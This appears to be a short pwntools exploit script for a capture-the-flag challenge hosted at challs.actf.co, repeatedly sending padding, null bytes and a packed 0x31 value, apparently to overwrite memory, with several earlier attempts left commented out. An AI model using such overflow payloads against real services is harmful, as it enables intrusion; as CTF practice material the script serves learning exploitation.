from pwn import *

io = remote('challs.actf.co', 31310)
for i in range(0x64):
    print(i)
    #io.sendlineafter(b": ", b"A"*31)
    #secret = io.recvuntil(b"\nSo?", drop=True)[-32:]
    #io.sendafter(b"? ", secret)
    #io.sendlineafter(b": ", b"A"*16 + b'\0'*8 + p64(0x31))
    io.sendline(b'A'*0x8*9)
    io.send(b'A'*32)
    io.sendline(b'A'*16+b'\0'*8+p64(0x31))
print(io.recvall())
